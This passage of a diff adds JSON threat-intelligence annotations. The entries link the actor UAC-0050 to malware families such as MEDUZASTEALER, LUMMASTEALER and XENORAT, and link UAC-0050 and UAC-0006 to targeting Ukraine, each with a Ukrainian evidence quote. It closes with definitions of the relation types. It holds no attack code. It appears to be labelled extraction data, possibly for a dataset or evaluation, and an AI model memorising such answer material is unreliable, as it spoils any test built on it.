+      "tail": "MEDUZASTEALER",
+      "evidence": "використання широкого спектру програм, таких як: REMCOS, TEKTONITRMS, MEDUZASTEALER"
+    },
+    {
+      "head": "UAC-0050",
+      "type": "uses-malware",
+      "tail": "LUMMASTEALER",
+      "evidence": "використання широкого спектру програм, таких як: REMCOS, TEKTONITRMS, MEDUZASTEALER, LUMMASTEALER"
+    },
+    {
+      "head": "UAC-0050",
+      "type": "uses-malware",
+      "tail": "XENORAT",
+      "evidence": "використання широкого спектру програм, таких як: REMCOS, TEKTONITRMS, MEDUZASTEALER, LUMMASTEALER, XENORAT"
+    },
+    {
+      "head": "UAC-0050",
+      "type": "uses-malware",
+      "tail": "SECTOPRAT",
+      "evidence": "використання широкого спектру програм, таких як: REMCOS, TEKTONITRMS, MEDUZASTEALER, LUMMASTEALER, XENORAT, SECTOPRAT"
+    },
+    {
+      "head": "UAC-0050",
+      "type": "uses-malware",
+      "tail": "MARSSTEALER",
+      "evidence": "використання широкого спектру програм, таких як: REMCOS, TEKTONITRMS, MEDUZASTEALER, LUMMASTEALER, XENORAT, SECTOPRAT, MARSSTEALER"
+    },
+    {
+      "head": "UAC-0050",
+      "type": "uses-malware",
+      "tail": "DARKTRACKRAT",
+      "evidence": "використання широкого спектру програм, таких як: REMCOS, TEKTONITRMS, MEDUZASTEALER, LUMMASTEALER, XENORAT, SECTOPRAT, MARSSTEALER, DARKTRACKRAT"
+    },
+    {
+      "head": "UAC-0050",
+      "type": "targets-country",
+      "tail": "Україна",
+      "evidence": "спроб викрадення грошових коштів з рахунків українських підприємств"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "targets-country",
+      "tail": "Україна",
+      "evidence": "викраденням грошових коштів у фізичних та юридичних осіб, займаються, щонайменше, UAC-0006"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "operates-under-brand",
+      "definition": "The threat actor conducts activities under a specified persona, brand name, or facade."
+    },
+    {
+      "name": "uses-malware",
+      "definition": "The threat actor employs a specific malware family during their operations."
+    },
+    {
+      "name": "uses-software",
+      "definition": "The threat actor utilizes a specific software utility or product during their operations."
+    },
+    {
+      "name": "targets-country",
+      "definition": "The threat actor directs malicious cyber activities toward entities in a specific country."
+    }
+  ]
+}
+```
